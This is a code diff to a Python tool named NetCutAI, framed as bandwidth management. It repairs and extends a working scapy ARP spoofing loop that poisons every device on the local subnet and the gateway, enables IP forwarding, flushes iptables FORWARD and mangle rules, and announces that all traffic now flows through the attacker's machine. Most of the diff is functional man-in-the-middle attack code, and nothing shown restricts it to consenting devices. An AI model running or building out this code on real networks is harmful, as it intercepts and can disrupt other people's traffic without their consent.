@@ -102,8 +102,14 @@ class ARPSpoofer:
 
     def _spoof_loop(self):
         while not self.spoofing.is_set():
-            scapy.send(scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"]), verbose=False)
-            scapy.send(scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"]), verbose=False)
+            # Send to target (tell target that gateway is at our MAC)
+            pkt1 = scapy.Ether(dst=self.target["mac"]) / scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"])
+            scapy.sendp(pkt1, verbose=False)
+            
+            # Send to gateway (tell gateway that target is at our MAC)
+            pkt2 = scapy.Ether(dst=self.gateway["mac"]) / scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"])
+            scapy.sendp(pkt2, verbose=False)
+            
             time.sleep(0.5)
 
     def start(self):
@@ -151,16 +157,16 @@ class TrafficMonitor:
         """Get byte count from iptables"""
         try:
             if direction == "up":
-                cmd = f"iptables -L FORWARD -v -n -x | grep -E '^\\s+[0-9]+\\s+[0-9]+\\s+ACCEPT\\s+all\\s+--\\s+\\*\\s+\\*\\s+{ip}'"
+                # Packets FROM the device (source IP matches)
+                cmd = f"iptables -L FORWARD -v -n -x -w | awk '/{ip}.*0\.0\.0\.0\/0/ {{print $2; exit}}'"
             else:
-                cmd = f"iptables -L FORWARD -v -n -x | grep -E '^\\s+[0-9]+\\s+[0-9]+\\s+ACCEPT\\s+all\\s+--\\s+\\*\\s+\\*\\s+[0-9.]+\\s+{ip}'"
+                # Packets TO the device (destination IP matches)
+                cmd = f"iptables -L FORWARD -v -n -x -w | awk '/0\.0\.0\.0\/0.*{ip}/ {{print $2; exit}}'"
             
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            if result.stdout:
-                parts = result.stdout.strip().split()
-                if len(parts) >= 2:
-                    return int(parts[1])
-        except:
+            if result.stdout.strip():
+                return int(result.stdout.strip())
+        except Exception as e:
             pass
         return 0
 
@@ -334,6 +340,9 @@ class NetCutAI:
             print(colored("[-] Run with sudo!", "red"))
             sys.exit(1)
         
+        # Enable IP forwarding immediately
+        enable_ip_forwarding()
+        
         self.iface = get_default_interface()
         self.gateway_ip = get_gateway_ip()
         self.subnet = get_subnet_cidr(self.iface)
@@ -383,8 +392,18 @@ class NetCutAI:
         print(colored("🤖 STARTING AI BANDWIDTH MANAGEMENT SYSTEM", "green", attrs=["bold"]))
         print(colored("="*80, "cyan"))
         
-        # Enable IP forwarding
-        enable_ip_forwarding()
+        # Verify IP forwarding
+        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
+            if f.read().strip() != '1':
+                print(colored("[!] Warning: IP forwarding not enabled!", "red"))
+                enable_ip_forwarding()
+        
+        print(colored("[✓] IP forwarding: ENABLED", "green"))
+        
+        # Clear existing iptables FORWARD rules
+        print(colored("[+] Clearing old iptables rules...", "cyan"))
+        subprocess.run("iptables -F FORWARD", shell=True)
+        subprocess.run("iptables -t mangle -F", shell=True)
         
         # Start monitoring
         self.monitor = TrafficMonitor(self.devices)
@@ -395,12 +414,26 @@ class NetCutAI:
         self.controller.set_gateway(self.gateway)
         
         # Start ARP spoofing for all devices
-        print(colored("\n[+] Positioning as network gateway (ARP spoofing)...", "cyan"))
+        print(colored("\n[+] Starting ARP spoofing for all devices...", "cyan"))
         for ip, info in self.devices.items():
             self.controller.start_spoofing({"ip": ip, "mac": info["mac"]})
+            print(colored(f"  ✓ Spoofing {ip}", "green"))
         
-        time.sleep(2)
-        print(colored("[✓] MITM active - monitoring all traffic\n", "green"))
+        time.sleep(3)
+        print(colored("\n[✓] MITM ACTIVE - All traffic now flows through this machine\n", "green", attrs=["bold"]))
+        
+        # Test if traffic is being captured
+        print(colored("[+] Waiting 5 seconds to capture initial traffic...", "cyan"))
+        time.sleep(5)
+        
+        test_stats = self.monitor.get_current_stats()
+        if all(s["up"] == 0 and s["down"] == 0 for s in test_stats.values()):
+            print(colored("\n⚠️  WARNING: No traffic captured yet!", "yellow", attrs=["bold"]))
+            print(colored("   Make sure target devices are ACTIVELY using internet:", "yellow"))
+            print(colored("   • Open YouTube and play a video", "white"))
+            print(colored("   • Download a large file", "white"))
+            print(colored("   • Browse multiple websites", "white"))
+            print(colored("\n   Monitor will start showing data once devices use internet.\n", "cyan"))
         
         self.running = True
         self._display_loop()
